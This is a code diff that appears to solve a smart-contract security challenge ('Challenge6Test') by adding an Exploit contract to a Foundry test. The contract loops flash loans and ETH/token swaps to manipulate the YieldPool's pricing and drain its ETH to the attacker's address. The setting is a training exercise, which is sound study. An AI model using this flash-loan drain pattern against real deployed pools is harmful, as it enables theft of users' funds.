@@ -8,7 +8,59 @@ import {YieldPool, SecureumToken, IERC20} from "../src/6_yieldPool/YieldPool.sol
 //          DEFINE ANY NECESSARY CONTRACTS HERE             //
 //    If you need a contract for your hack, define it below //
 ////////////////////////////////////////////////////////////*/
+import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
 
+contract Exploit is IERC3156FlashBorrower{
+
+    YieldPool public yieldPool;
+    address attacker;
+    uint256 msgvalue;
+
+    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");
+
+    constructor(address _pool){
+        yieldPool = YieldPool(payable(_pool));
+        attacker = msg.sender;
+    }
+
+    function attack() public payable{ 
+
+        msgvalue = msg.value;
+        IERC20(yieldPool.TOKEN()).approve(address(yieldPool), type(uint256).max);
+
+        while(msgvalue < 100 ether){
+            // @note
+            // ETH exchange to token, token become more expensive; Token exchange to ETH, token become cheap
+            // flashloan token, ETH become cheap; flashloan ETH, token become cheap
+            yieldPool.flashLoan(
+                IERC3156FlashBorrower(address(this)), yieldPool.ETH(), msgvalue * 100, new bytes(1) //@note need to pay fee
+            );
+            yieldPool.tokenToEth(IERC20(yieldPool.TOKEN()).balanceOf(address(this)));
+            msgvalue = address(this).balance;
+        }
+
+        attacker.call{value: address(this).balance}("");
+        
+    }
+
+
+    function onFlashLoan(
+        address initiator,
+        address token,
+        uint256 amount,
+        uint256 fee,
+        bytes calldata data
+    ) external returns (bytes32){
+
+        yieldPool.ethToToken{value: address(this).balance}();
+        console.log(IERC20(yieldPool.TOKEN()).balanceOf(address(this)));
+
+        return CALLBACK_SUCCESS;
+    }
+
+
+    receive() external payable {}
+}
 
 
 
@@ -46,7 +98,8 @@ contract Challenge6Test is Test {
         // terminal command to run the specific test:       //
         // forge test --match-contract Challenge6Test -vvvv //
         ////////////////////////////////////////////////////*/
-
+        Exploit exp = new Exploit(address(yieldPool));
+        exp.attack{value: 0.1 ether}();
 
 
 
